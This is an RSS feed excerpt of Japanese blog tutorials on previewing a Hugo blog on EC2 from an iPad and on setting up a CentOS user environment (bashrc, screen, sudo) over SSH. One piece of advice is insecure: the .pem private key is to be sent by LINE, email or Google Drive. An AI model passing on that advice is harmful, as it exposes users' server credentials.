&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">hugo server --baseURL&lt;span class="o">=[&lt;/span>URL&lt;span class="o">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上記のコマンドでアクセスできるかというと、まだ駄目です。&lt;/p>
&lt;p>最終的なコマンドは&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート]
&lt;/code>&lt;/pre>&lt;p>となります。&lt;/p>
&lt;p>ここで重要なのが&lt;code>--bind=0.0.0.0&lt;/code>になります。&lt;/p>
&lt;p>ここまできたら、ほぼほぼ確認できるようになっています。&lt;/p>
&lt;h3 id="ec2でファイヤーウォールを設定している場合">EC2でファイヤーウォールを設定している場合&lt;/h3>
&lt;p>EC2を使用している場合、ALBやELBを設定していることが多いと思います。&lt;br>
先程指定したポートが空いているか確認して、空いていない場合は、EC2の設定で開けましょう。&lt;/p>
&lt;p>EC2のインバウンドルールに開けたいポートを追加します。&lt;br>
セキュリティーグループを使用している場合は、「インバウンドのルールを編集」をクリックして追加します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 164;
flex-basis: 395px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img09.png" data-size="980x594">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img09.png"
width="980"
height="594"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>下にある「ルールを追加」を押して、「カスタムTCP」にします。&lt;br>
次に、ポート範囲に開けたいポートを入力して、CIDR ブロックにインターネットゲートウェイを指すすべての IPv4 トラフィック (0.0.0.0/0) のルートを追加します。&lt;br>
IPv6の場合も追加したいので、もう一度「ルールを追加」を押して、ポートを入力し、IPv6 トラフィック (::/0) のルートを入力します。&lt;br>
設定が終わったら、保存しましょう。&lt;br>
これでポートの設定が完了しました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 411;
flex-basis: 988px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img10.png" data-size="980x238">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img10.png"
width="980"
height="238"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="ipadで確認しながら更新をする">iPadで確認しながら更新をする&lt;/h2>
&lt;p>サーバにログインして、先程の&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート]
&lt;/code>&lt;/pre>&lt;p>でサーバを立ち上げます。&lt;br>
このとき、下書きの記事を表示したいときは&lt;/p>
&lt;pre tabindex="0">&lt;code>$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] -D
&lt;/code>&lt;/pre>&lt;p>として下書きも表示するようにしましょう。&lt;/p>
&lt;p>また、サーバのアドレスがわからない場合は&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl -s ifconfig.me
&lt;/code>&lt;/pre>&lt;p>とすればIPアドレスがわかります。&lt;/p>
&lt;p>iPadにはSplitビューがついているので、片方でブログを書きながら、　もう片方でSafariなどを立ち上げて立ち上げて記事を確認しながら記述することが可能です。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img11.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img11.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>構築が終わったら&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/" target="_blank" rel="noopener"
>iPadに開発環境を構築してみるテスト&lt;/a>を参考にして、EC2内での詳細な設定をしてみましょう。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>iPadを使うとどこでも、重いパソコンを持たなくても簡単にブログを更新することができるようになります。是非オススメなので、みなさんも試してみてください。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/iPad%e5%ae%8c%e5%85%a8%e3%83%9e%e3%83%8b%e3%83%a5%e3%82%a2%e3%83%ab2022-%e5%85%a8%e6%a9%9f%e7%a8%ae%e5%af%be%e5%bf%9c-%e5%9f%ba%e6%9c%ac%e6%93%8d%e4%bd%9c%e3%81%8b%e3%82%89%e6%b4%bb%e7%94%a8%e6%8a%80%e3%81%be%e3%81%a7%e8%a9%b3%e7%b4%b0%e8%a7%a3%e8%aa%ac-standards/dp/4866365285/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51Vmx-LPwGL.jpg" alt=" iPad完全マニュアル2022(全機種対応/基本操作から活用技まで詳細解説) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> iPad完全マニュアル2022(全機種対応/基本操作から活用技まで詳細解説) &lt;/h2>
&lt;p> iPadをしっかり使いこなすための決定版ガイドブック。 iPadOS 15に対応した最新版です。 2021年発売の最新モデルはもちろん、すべてのiPad Pro、iPad Air、iPad、iPad miniの全モデル ホームボタン搭載/非搭載含めすべての機種に対応します。 &lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/AWS%e3%81%a7%e3%81%af%e3%81%98%e3%82%81%e3%82%8b%e3%82%a4%e3%83%b3%e3%83%95%e3%83%a9%e6%a7%8b%e7%af%89%e5%85%a5%e9%96%80-%e5%ae%89%e5%85%a8%e3%81%a7%e5%a0%85%e7%89%a2%e3%81%aa%e6%9c%ac%e7%95%aa%e7%92%b0%e5%a2%83%e3%81%ae%e3%81%a4%e3%81%8f%e3%82%8a%e6%96%b9-%e4%b8%ad%e5%9e%a3-%e5%81%a5%e5%bf%97/dp/4798163430/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/511vlSp5gZL.jpg" alt=" AWSではじめるインフラ構築入門 安全で堅牢な本番環境のつくり方 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> AWSではじめるインフラ構築入門 安全で堅牢な本番環境のつくり方 &lt;/h2>
&lt;p> AWSのネイティブ機能を組み合わせて 安全かつ堅牢なインフラを構築・運用 本書は、AWS(Amazon Web Services)を利用して、 インフラを構築/運用する方法を解説する入門書です。 クラウドでネットワーク&amp;amp;サーバー構築を行うために必要な基礎知識や、 AWSのネイティブ機能を組み合わせて安全かつ堅牢なインフラを構築/運用 するための設定方法やノウハウを解説します。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>iPadに開発環境を構築してみるテスト</title><link>https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/</link><pubDate>Fri, 28 Jan 2022 14:02:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/linux.jpg" alt="Featured image of post iPadに開発環境を構築してみるテスト" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;ul>
&lt;li>まずはこちらをやりましょう。&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/" target="_blank" rel="noopener"
>パソコンは不要。iPhoneやiPadなどのスマホ、タブレットでできるブログ投稿&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="必要なもの">必要なもの&lt;/h2>
&lt;ul>
&lt;li>iPad&lt;/li>
&lt;li>Termiusというアプリ&lt;br>
&lt;a class="link" href="https://apps.apple.com/jp/app/termius-ssh-client/id549039908" target="_blank" rel="noopener"
>Termius: Terminal &amp;amp; SSH client&lt;/a>&lt;/li>
&lt;li>AWSのサーバーインスタンス&lt;br>
&lt;a class="link" href="https://qiita.com/kanegoon/items/4bcdf5184cf1752eb44f" target="_blank" rel="noopener"
>AWS EC2 インスタンスの作成&lt;/a>&lt;/li>
&lt;li>AWSインスタンスにログインするために必要なpemファイル（キーチェイン）&lt;br>
&lt;a class="link" href="https://qiita.com/takuma-jpn/items/b2c04b7a271a4472a900" target="_blank" rel="noopener"
>AWS EC2にSSHでアクセスする方法&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="awsインスタンスへの接続">AWSインスタンスへの接続&lt;/h2>
&lt;p>pemファイルをスマホに送る&lt;br>
インスタンスを作るときにpemファイルをダウンロードしたと思います&lt;br>
（してなかったら、pemファイルは一回しかダウンロードさせてくれないのでインスタンスを作り直しましょう）&lt;br>
このpemファイルをＰＣのエディターで開き、内容をテキストファイルにペーストします。&lt;br>
このファイルをＬＩＮＥなりメールなりGoogleドライブなりでスマホに送ります。&lt;/p>
&lt;p>pemファイルをTermiusで読み込みます&lt;/p>
&lt;ul>
&lt;li>ＰＣ上で鍵ファイル(.pem)をテキスト化してiPadで内容をコピーして貼り付けられるようにしておくことが重要です。&lt;br>
&lt;a class="link" href="https://tomikyblog.com/termius%e3%82%92%e4%bd%bf%e3%81%a3%e3%81%a6%e3%81%bf%e3%81%9f" target="_blank" rel="noopener"
>iPad Proでsshクライアント「Termius」を使ってみた&lt;br>
&lt;/a>&lt;br>
&lt;a class="link" href="https://pkunallnet.com/pcinfo/apple/ipad-aws-linuxconnection/" target="_blank" rel="noopener"
>iPadからAWSのEC2インスタンス(LINUX)にSSH接続する方法&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="アカウントの作成">アカウントの作成&lt;/h2>
&lt;p>rootでの作業でも良いのですが、一般論としてここではアカウントの作成から説明します。&lt;/p>
&lt;p>まずは、サーバーに接続します。&lt;/p>
&lt;pre tabindex="0">&lt;code>centos$
&lt;/code>&lt;/pre>&lt;p>いわゆるrootでログインした訳です。&lt;br>
ここでユーザー名 suzuki を追加します。&lt;/p>
&lt;pre tabindex="0">&lt;code>centos$ useradd suzuki
&lt;/code>&lt;/pre>&lt;p>さらに suzuki のパスワードも設定します。&lt;/p>
&lt;pre tabindex="0">&lt;code>centos$ passwd suzuki
&lt;/code>&lt;/pre>&lt;p>パスワードは２回同じ入力を求められます&lt;br>
では rootからsuzukiにアカウントを切り換えます。&lt;br>
ユーザーの切り替えは su コマンドを使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>centos$ su suzuki
パスワード：
suzuki$
&lt;/code>&lt;/pre>&lt;p>suzukiに切り替わりました。&lt;br>
自分自身がどこにいるのかを確認します。&lt;br>
カレントディレクトリの確認は pwd コマンドを使います。&lt;br>
ディレクトリの移動は cd コマンド&lt;br>
ホームディレクトリは ~ で表します。&lt;br>
ホームディレクトリへの移動は cd ~ となります。&lt;/p>
&lt;pre tabindex="0">&lt;code>centos$ pwd
/home/centos
$ cd ~
$ pwd
$ /home/suzuki
$
&lt;/code>&lt;/pre>&lt;h2 id="bashrc-の修正">~/.bashrc の修正&lt;/h2>
&lt;p>ここでは ~/.basrcファイルを修正します。&lt;br>
まず、~/.basrc ファイルのバックアップをとります。&lt;br>
ここではファイル名先頭のピリオドを落として ls コマンドで見えるようにしておきます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cp ~/.bashrc ~/bashrc.bak
&lt;/code>&lt;/pre>&lt;p>では、~/.bashrc を vimで開いて編集します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ vim ~/.bashrc
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:~/.bashrc" data-lang="bash:~/.bashrc">&lt;span class="c1"># .bashrc&lt;/span>
&lt;span class="c1"># Source global definitions&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f /etc/bashrc &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
. /etc/bashrc
&lt;span class="k">fi&lt;/span>
&lt;span class="c1"># ターミナルの表示&lt;/span>
&lt;span class="nb">export&lt;/span> &lt;span class="nv">PS1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;bash-\v&lt;/span>$&lt;span class="s2"> &amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="c1"># 基本言語フォーマットをUTF-8へ&lt;/span>
&lt;span class="nb">export&lt;/span> &lt;span class="nv">LANG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ja_JP.UTF-8&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="c1"># User specific environment and startup programs&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">rm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;rm -i&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">cp&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;cp -i&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">mv&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;mv -i&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="c1"># grepとls のカラー表示&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">grep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;grep --color=auto&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">ls&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ls --color=auto&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="c1"># screen&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;screen -RR&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="c1"># Github ディレクトリへ移動&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">g&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;cd ~/GitHub&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>編集が終わったら ~/.bashrc を再読込します。&lt;br>
Linux での再読込は . です&lt;/p>
&lt;pre tabindex="0">&lt;code>$ . ~/.bashrc
$
&lt;/code>&lt;/pre>&lt;p>では GitHub にある様々なディレクトリを格納する Githubディレクトリを作成します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ mkdir GitHub
$
&lt;/code>&lt;/pre>&lt;p>以降の github プロジェクトは今作成した GitHub ディレクトリ以下に作成します。&lt;/p>
&lt;h2 id="ターミナルの入力で大文字と小文字を区別せずに補完する">ターミナルの入力で大文字と小文字を区別せずに補完する&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash:~/.inputrc" data-lang="bash:~/.inputrc">
# 大文字小文字を区別しない
set completion-ignore-case on
# 以下日本語入力の必要がある場合に必要(なくてもよい）
set input-meta on
set output-meta on
set convert-meta off
set meta-flag on
&lt;/code>&lt;/pre>&lt;p>編集が終わったら ~/.inputrc を再読込します。&lt;br>
Linux での再読込は . です&lt;/p>
&lt;pre tabindex="0">&lt;code>$ . ~/.inputrc
$ cd ~
$ pwd
/home/suzuki
$ g
$ pwd
/home/suzuki/GitHub
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>~/.inputrc を root ユーザーになって /etc/inputrc に追記するとすべてのユーザーが大文字小文字を区別することなくターミナルで補完することができます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="screen-のインストール">screen のインストール&lt;/h2>
&lt;p>screen はターミナル内で複数の仮想ターミナルを起動して使うことができる画面管理ソフトです。&lt;br>
メリットは、&lt;/p>
&lt;ul>
&lt;li>ターミナルウインドウのタブを複数作成し、ここのタブでサーバーにログインする必要がないので、不要なセッションを作らなくてすむ。&lt;/li>
&lt;li>開いていた端末の状態を保持しておける。&lt;/li>
&lt;li>回線が切れる、スタンバイなどのセッション切れでもレジュームされる。&lt;/li>
&lt;li>一つの画面をさらに分割できるので、複数端末でログ監視したいときなどに超便利。&lt;/li>
&lt;/ul>
&lt;p>まずはscreen がインストールされているのかの確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ screen -v
Screen version 4.08.00 (GNU) 05-Feb-20
$
&lt;/code>&lt;/pre>&lt;p>インストールされていれば以下の作業はする必要がありません。&lt;br>
インストールされていなければ、yum コマンドでインストールして下さい。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo ＜sudo で rootになります＞
# ＜rootになると # になります&amp;gt;
# yum -y install screen
読み込んだプラグイン:fastestmirror
base | 3.6 kB 00:00:00
extras | 3.4 kB 00:00:00
updates | 3.4 kB 00:00:00
(1/2): extras/7/x86_64/primary_db | 115 kB 00:00:00
(2/2): updates/7/x86_64/primary_db | 2.2 MB 00:00:00
Loading mirror speeds from cached hostfile
* base: ftp.iij.ad.jp
* extras: ftp.iij.ad.jp
* updates: www.ftp.ne.jp
依存性の解決をしています
--&amp;gt; トランザクションの確認を実行しています。
---&amp;gt; パッケージ screen.x86_64 0:4.1.0-0.23.20120314git3c2946.el7_2 を インストール
--&amp;gt; 依存性解決を終了しました。
依存性を解決しました
======================================================================================================================================================
Package アーキテクチャー バージョン リポジトリー 容量
======================================================================================================================================================
インストール中:
screen x86_64 4.1.0-0.23.20120314git3c2946.el7_2 base 552 k
トランザクションの要約
======================================================================================================================================================
インストール 1 パッケージ
総ダウンロード容量: 552 k
インストール容量: 914 k
Downloading packages:
screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64.rpm | 552 kB 00:00:00
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
インストール中 : screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64 1/1
検証中 : screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64 1/1
インストール:
screen.x86_64 0:4.1.0-0.23.20120314git3c2946.el7_2
完了しました!
$
# rootからsuzukiにアカウントを切り換えます
$ su suzuki
# screenコマンドがどこにインストールされているのかを確認します。
$ which screen
/usr/bin/screen
$
&lt;/code>&lt;/pre>&lt;h2 id="screenrc-の修正">screenrc の修正&lt;/h2>
&lt;p>screenコマンドをさらに便利にするために screenrc ファイルを修正します。&lt;/p>
&lt;pre tabindex="0">&lt;code># ユーザーをroot から suzuki に変えます。
$ su suzuki
$
&lt;/code>&lt;/pre>&lt;p>以下を ~/.screenrc として作成して保存します。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:~/.screenrc" data-lang="bash:~/.screenrc">
# Ctrl + z で screenの操作モードへの切り換え
escape ^Zz
# スクロールバッファを大きくする
defscrollback 10000
# ステータスバーをカスタマイズ
hardstatus on
hardstatus alwayslastline '%{= kw}%02c:%s %{= .y}%H %L=%{= .b}%-w%46&amp;gt;%{= .r}%n %t*%{= .b}%+w%-16=%{= .y}[%l]'
# スタートメッセージを表示させない
startup_message off
# ビープを鳴らさない
vbell off
#termの設定
term ansi
bind r
bind ^r
#
&lt;/code>&lt;/pre>&lt;p>上記 ~/.bashrc の修正で、screenコマンドの呼び出しを s にしています。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:~/.bashrc" data-lang="bash:~/.bashrc">
&lt;span class="c1"># screen&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;screen -RR&amp;#39;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ですので、ターミナルからは s だけで screen -RR コマンドを実行したことと同じになります。&lt;/p>
&lt;pre tabindex="0">&lt;code># screenの起動
$ screen
# screenの終了
$ exit
$
# screenの起動
$ s
# screenの終了
$ exit
&lt;/code>&lt;/pre>&lt;p>~/.bashrc にエイリアスを作成していなければ screen で起動しますし、~/.bashrcにエイリアスを作成していれば（ここでは「s」） $ s で一発起動します。screenを抜けるときは「exit」です。&lt;/p>
&lt;h2 id="screen-を使ってみます">screen を使ってみます&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>screen の起動(screen)&lt;br>
まず screen を起動しなくては始まりません。 ログインしたターミナルで「screen」と打てば screen が起動します。 screen から抜けるには普通にログアウトするように 「exit」 や [Ctrl+d]で抜けられます。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>新しいウィンドウを開始する([Ctrl+c])&lt;br>
「[Ctrl+c]」で新しいウィンドウを開始できます。 幾つでも作れます。 不要になったウィンドウは 「exit」 や [Ctrl+d] で消せます。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>次のウィンドウに移動する([Ctrl+n])&lt;br>
開いている隣のウインドウに移動します。カスタマイズした~/.screenrcを使っている人はステータスバーで確認できて便利です。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>詳しくはこちら&lt;br>
&lt;a class="link" href="https://qiita.com/hnishi/items/3190f2901f88e2594a5f" target="_blank" rel="noopener"
>Linux screenコマンド使い方&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>screen は王者のコマンドです。プログラマーの多くはローカルのターミナルでタブを作成します。screen はサーバー上で仮想端末を作成します。screenはvim同様、プログラマーを選びます。Linuxを語るなら vim と screen そして bash の習熟が必須なのです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="sudoユーザーを追加する方法">sudoユーザーを追加する方法&lt;/h2>
&lt;p>sudoユーザーに追加していないユーザーでsudoコマンドを実行すると、&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo less /etc/passwd
[sudo] password for suzuki:
suzuki is not in the sudoers file. This incident will be reported.
&lt;/code>&lt;/pre>&lt;p>こんな事を言われます。&lt;br>
ということで、ここでは特定のユーザー（ここでは「suzuki」）がsudoコマンドを実行できるようにします。&lt;/p>
&lt;p>/etc/sudoers ファイルにユーザーを追加します。&lt;/p>
&lt;p>まずはrootユーザーになります。&lt;/p>
&lt;p>ユーザーsuzuki をぬけてrootになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ exit
&lt;/code>&lt;/pre>&lt;p>現在のグループを確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code># sudo vim /etc/sudoers
&lt;/code>&lt;/pre>&lt;p>以下の記述があれば wheelグループに suzukiを追加すればよいです。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:/etc/sudoersの抜粋" data-lang="bash:/etc/sudoersの抜粋">
## Allow members of group sudo to execute any command
%wheel ALL=(ALL:ALL) ALL
&lt;/code>&lt;/pre>&lt;p>ではまず現状を確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code># cat /etc/group | grep suzuki
&lt;/code>&lt;/pre>&lt;p>sudoのグループ（centosなら wheel) に suzuki を追加します。&lt;/p>
&lt;pre tabindex="0">&lt;code># sudo usermod -G wheel suzuki
&lt;/code>&lt;/pre>&lt;p>確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code># cat /etc/group | grep suzuki
wheel:x:10:suzuki
suzuki:x:1001:
#
&lt;/code>&lt;/pre>&lt;p>これで、ローカルアカウント suzuki で、必要に応じて sudoコマンドをつかって安全に作業することができるようになりました。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>当たり前の話ではありますが、root で作業するのはやめましょう。必要に応じて $ su すればよいのです。Linux/Unixとはそういうものなのです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
